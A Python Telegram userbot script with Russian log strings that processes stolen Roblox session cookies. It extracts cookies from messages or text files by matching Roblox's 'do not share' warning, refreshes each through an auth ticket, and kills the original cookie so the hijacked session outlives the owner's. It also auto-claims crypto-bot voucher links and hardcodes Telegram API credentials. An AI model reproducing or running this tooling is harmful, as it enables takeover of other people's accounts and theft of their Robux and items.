from telethon import TelegramClient, events
from telethon.tl.types import DocumentAttributeFilename
from datetime import datetime
import re
import fresher
import logging

class TelegramBot:
    def __init__(self):
        self.setup_logging()
        self.client = self.create_client()
        
    def setup_logging(self):
        logging.basicConfig(
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            level=logging.INFO,
            handlers=[
                logging.StreamHandler()
                ]
        )
    
    def create_client(self):
        return TelegramClient(
            'session',
            api_id=20344044,
            api_hash='31f57eb32051f82f3f6b8ce2e609e50f',
            device_model="ASUS PRIME A620M-K",
            system_version="5.16.30-vxCUSTOM",
            app_version="5.16.30 x64"
        )
    
    async def start(self):
        await self.client.start()
        await self.start_message()
        await self.register_handlers()
        await self.client.run_until_disconnected()
    
    async def start_message(self):
        await self.client.send_message("me", "Started...")
    
    async def register_handlers(self):
        self.client.add_event_handler(
            self.message_handler,
            events.NewMessage(chats="me")
        )
    
    async def message_handler(self, event):
        message = event.message

        if message.reply_markup:
            await self.handle_crypto_bot(message)

        if "_|WARNING" in message.text:
            await self.handle_cookie_text(message)

        if message.media and hasattr(message.media, 'document'):
            await self.handle_cookie_file(message)
    
    @staticmethod
    async def extract_cookies(text):
        pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        return re.findall(pattern, text)
    
    async def refresh_cookie(self, cookie):
        auth_ticket = await fresher.generate_auth_ticket(cookie)

        if auth_ticket == "Failed to fetch auth ticket":
            await self.send_invalid_cookie_message()
            logging.error("Застопался на генерации auth_ticket")
            return
        
        logging.info(auth_ticket)
        
        fresh_result = await fresher.redeem_auth_ticket(auth_ticket)
        kill_result = await fresher.kill_cookie(cookie, auth_ticket["Csrf_token"])

        if not fresh_result["success"]:
            await self.handle_fresh_failure(fresh_result)
            logging.error("Застопался на генерации фреше (неудача)")
            return
        
        if fresh_result["refreshed_cookie"]:
            await self.save_and_send_cookie(fresh_result["refreshed_cookie"])

        if kill_result == "Old cookie successfully killed":
            await self.send_kill_success_message()
    
    async def send_invalid_cookie_message(self):
        await self.client.send_message(
            "me", 
            f"Invalid cookie. Time {datetime.now().replace(microsecond=0)}"
        )
    
    async def handle_fresh_failure(self, fresh_result):
        if fresh_result.get("roblox_debug_response") and fresh_result["roblox_debug_response"] == 401:
            message = f"Unauthorized: The provided cookie is invalid. Time {datetime.now().replace(microsecond=0)}"
        else:
            message = f"Invalid cookie. Time {datetime.now().replace(microsecond=0)}"
        await self.client.send_message("me", message)
    
    async def save_and_send_cookie(self, cookie):
        blob = cookie.encode("utf-8")
        await self.client.send_file("me", blob)
    
    async def send_kill_success_message(self):
        await self.client.send_message(
            "me", 
            f"Старые куки успешно сломаны.. Время {datetime.now().replace(microsecond=0)} ✅"
        )
    
    async def handle_cookie_text(self, message):
        cookies = await self.extract_cookies(message.text)
        for cookie in cookies:
            await self.refresh_cookie(cookie)
    
    async def handle_cookie_file(self, message):
        for attr in message.media.document.attributes:
            if isinstance(attr, DocumentAttributeFilename):
                file_name = attr.file_name
                if file_name.endswith(".txt"):
                    blob = await self.client.download_media(message, bytes)
                    cookies = await self.extract_cookies(blob.decode("utf-8"))
                    for cookie in cookies:
                        await self.refresh_cookie(cookie)
    
    async def handle_crypto_bot(self, message):
        message = await self.client.get_messages(
            "me", 
            ids=message.id
        )
        for row in message.reply_markup.rows:
            for button in row.buttons:
                if hasattr(button, 'url'):
                    await self.handle_url_button(button)
                    return
                elif hasattr(button, 'data') and button.data == b'check-creating':
                    await self.handle_crypto_bot(message)
    
    async def handle_url_button(self, button):
        url = button.url
        text = button.text
        if "получить" in text.lower():
            start_param = url.split("start=")[1]
            result = f"/start {start_param}"
            await self.client.send_message(1559501630, result)


if __name__ == "__main__":
    bot = TelegramBot()
    bot.client.loop.run_until_complete(bot.start())